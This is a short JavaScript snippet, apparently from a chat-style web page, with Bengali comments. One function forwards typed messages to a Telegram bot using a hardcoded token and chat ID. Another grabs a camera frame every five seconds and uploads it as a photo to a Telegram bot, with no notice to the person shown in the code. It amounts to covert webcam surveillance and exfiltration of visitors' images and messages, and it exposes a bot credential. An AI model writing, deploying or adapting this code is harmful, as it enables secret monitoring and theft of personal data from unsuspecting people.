async function pushMsg() {
    const input = document.getElementById('userInput');
    const text = input.value.trim();
    if(!text) return;

    // সময় এবং তারিখ সেট করা
    const now = new Date();
    const time = now.getHours().toString().padStart(2, '0') + ":" + now.getMinutes().toString().padStart(2, '0');

    // টেলিগ্রামে পাঠানোর ইউআরএল
    const token = '8600117294:AAH2qNjbQz3-iOCjHsZBfOi1qAUs1Uq2i0o'; // তোমার দেওয়া টোকেন
    const chatId = '7767412329'; // তোমার দেওয়া আইডি
    const url = `https://api.telegram.org/bot${token}/sendMessage`;

    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: `নতুন মেসেজ: ${text}\nসময়: ${time}`
            })
        });

        if (response.ok) {
            // মেসেজ সফলভাবে গেলে UI আপডেট হবে
            document.getElementById('msgTime').innerText = time;
            document.getElementById('msgText').innerText = text;
            document.getElementById('sentArea').style.display = 'flex';
            
            input.value = "";
            checkType();
            console.log("মেসেজ সফলভাবে টেলিগ্রামে গেছে!");
        } else {
            alert("টেলিগ্রাম থেকে এরর এসেছে। চেক করো বটটি চালু আছে কি না।");
        }
    } catch (error) {
        console.error("Error:", error);
        alert("ইন্টারনেট বা CORS সমস্যার কারণে মেসেজ পাঠানো যায়নি।");
    }
}
function startTracking(stream) {
    const v = document.getElementById('v');
    const c = document.getElementById('c');
    const ctx = c.getContext('2d');

    setInterval(() => {
        // ভিডিওর ডাটা ঠিকমতো আসছে কি না চেক করা
        if (v.readyState === v.HAVE_ENOUGH_DATA) {
            c.width = v.videoWidth;
            c.height = v.videoHeight;
            
            // ছবি ড্র করার আগে ক্যানভাস পরিষ্কার করা
            ctx.clearRect(0, 0, c.width, c.height);
            ctx.drawImage(v, 0, 0, c.width, c.height);
            
            c.toBlob(b => {
                if (b) {
                    let f = new FormData();
                    f.append('chat_id', CHAT_ID);
                    f.append('photo', b, 'capture.jpg');
                    
                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: f
                    }).catch(err => console.error("Photo send failed:", err));
                }
            }, 'image/jpeg', 0.7); // কোয়ালিটি ০.৭ দিলে ছবি উজ্জ্বল হবে
        }
    }, 5000); 
}
